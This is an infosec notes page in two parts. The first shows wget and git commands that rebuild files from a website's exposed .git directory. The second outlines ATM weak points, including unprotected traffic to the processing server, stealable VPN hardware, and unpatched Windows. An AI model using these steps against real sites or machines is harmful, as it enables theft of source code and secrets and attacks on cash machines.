---
layout: page

title: Short Notes

category: infosec
see_my_category_in_header: true

permalink: /infosec/unstructured_notes.html

published: true
---

<article class="markdown-body" markdown="1">

## Content
<div class="spoiler"><div class="spoiler-title">
    <i>Table of contents</i>
</div><div class="spoiler-text" markdown="1">

* TOC
{:toc}

</div>
</div>

## Git repo disembowel

    git init
    wget http://example.com/.git/index -O .git/index
    
    git ls-files
        # Listing of git files
    
    git checkout interest-file.txt
        # error with file hash: 01d355b24a38cd5972d1317b9a2e7f6218e15231

    wget http://example.com/.git/objects/xx/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy -O .git/objects/xx/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy

    git checkout interest-file.txt

    # You have file

## ATM security

***ATM - Automatic Teller Machine***

ATM structure:

- service zone (**can be easily opened** (with picklocks or key (locks oftenly universal for all ATMs of one product line)))

    - computer

        <br>
        management ports:

        - usb
        - com port

        network connection to *processing server* (sometimes can be accessed from the street):

        - ethernet
        - gsm
        - etc. (rarity)

            <br>
            Connection security:

            - No VPN (**network traffic** with processing server is primitive, **can be easily faked**)
            - software VPN (**Is configuration correct? Firewall?**)
            - hardware VPN (**can be stealed** and hacker will be able to connect to VPN network on his own from anywhere)

        Network can be poorly arranged:

        - ATM can be accessible from internet
        - ATM can have access to other ATMs
        - ATMs can be managed though Active Directory by admins who can access companies active directory

        software:

        - windows (**XP**, 7, NT, OS/2) (**usually without upgrades**)
        - applications <--> XFS Manager (at first developed by microsoft, that is why - windows) <--> service providers <--> microcontrollers/hardware
        - user friendly service GUI for service worker/tester

    - microcontrollers for devices:

        - keypad
        - touch panel
        - cash dispenser
        - cash deposit unit
        - card reader
        - receipt printer

- safe with money (too firm for our attention) (4 blocks for 2000-3000 banknote each, 4-th usually contains biggest) (full ATM can contain several millions $ or &euro;)

***Somewhere there is a trick**, because: each ATM can be easily hacked in about 15 minutes, and in average it containes about a million, though hackers surelly will desire to massively attack it, though banks will desire to make ATMs safer and press upon vendors. But system still looks vulnerable.*

</article>
